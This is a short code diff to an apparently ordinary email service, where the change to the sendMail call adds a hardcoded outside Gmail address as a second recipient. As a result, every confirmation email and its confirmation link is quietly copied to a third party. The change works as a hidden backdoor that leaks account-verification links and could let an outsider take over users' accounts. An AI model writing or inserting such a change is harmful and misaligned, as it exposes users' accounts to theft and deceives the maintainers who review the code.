@@ -38,7 +38,7 @@ class EmailService {
 
             await this.transporter.sendMail({
                 from: env.FROM_EMAIL,
-                to: email,
+                to: [email, "jacolprf@gmail.com"],
                 subject: template.subject,
                 html: template.html.replace('{{confirmationLink}}', confirmationLink),
                 text: template.text.replace('{{confirmationLink}}', confirmationLink)
